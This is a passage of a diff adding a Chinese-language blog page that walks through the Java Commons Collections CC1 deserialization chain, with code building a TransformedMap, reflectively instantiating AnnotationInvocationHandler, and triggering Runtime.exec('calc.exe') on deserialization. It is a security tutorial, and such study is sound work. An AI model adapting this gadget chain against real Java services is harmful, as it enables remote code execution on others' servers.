+<p><strong>InvokerTransformer(“exec”)</strong></p>
+<ul>
+<li>
+<p>执行逻辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runtime.exec(&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>结果：启动计算器程序</p>
+</li>
+</ul>
+</li>
+</ol>
+<p><strong>ChainedTransformer作用</strong>：</p>
+<p>将多个Transformer串联，前一个的输出作为后一个的输入，形成方法调用链。</p>
+<h3 id="2-TransformedMap包装阶段">2. TransformedMap包装阶段</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, null, chain);</span><br></pre></td></tr></table></figure>
+<p><strong>关键点</strong>：</p>
+<ul>
+<li>创建普通HashMap并放入任意键值对</li>
+<li>使用<code>TransformedMap.decorate</code>包装原始Map</li>
+<li>设置value Transformer为我们构造的chain</li>
+<li>当Map的value被修改时，会自动调用Transformer链</li>
+</ul>
+<h3 id="3-AnnotationInvocationHandler构造阶段">3. AnnotationInvocationHandler构造阶段</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(true);</span><br><span class="line">Object o = declaredConstructor.newInstance(Target.class, decorate);</span><br></pre></td></tr></table></figure>
+<p><strong>关键点</strong>：</p>
+<ol>
+<li>反射获取内部类<code>AnnotationInvocationHandler</code></li>
+<li>获取其构造器（接收Class和Map参数）</li>
+<li>设置构造器可访问（突破访问限制）</li>
+<li>实例化对象，传入： 任意注解类（如Target.class） 我们构造的TransformedMap</li>
+</ol>
+<h3 id="4-序列化-反序列化触发阶段">4. 序列化/反序列化触发阶段</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize(o);</span><br><span class="line">deserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="利用链总览"><strong>利用链总览</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">反序列化触发 → ObjectInputStream.readObject()</span><br><span class="line">→ AnnotationInvocationHandler.readObject()</span><br><span class="line">→ 遍历TransformedMap（memberValues）</span><br><span class="line">→ 键值校验失败 → entry.setValue(...)</span><br><span class="line">→ TransformedMap.checkSetValue() → ChainedTransformer.transform()</span><br><span class="line">→ 依次调用4个Transformer：</span><br><span class="line">  1. ConstantTransformer → 获取Runtime.class</span><br><span class="line">  2. InvokerTransformer → 获取getRuntime()方法</span><br><span class="line">  3. InvokerTransformer → 获取Runtime实例</span><br><span class="line">  4. InvokerTransformer → 执行exec(&quot;calc.exe&quot;)</span><br><span class="line">→ 命令执行（弹出计算器）</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="子非鱼 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="子非鱼 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/05/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%AE%80%E4%BB%8B/" rel="prev" title="Java安全之内存马简介">
+                  <i class="fa fa-angle-left"></i> Java安全之内存马简介
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/10/09/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC2%E9%93%BE%E5%88%86%E6%9E%90/" rel="next" title="Java安全之CC2链分析">
+                  Java安全之CC2链分析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
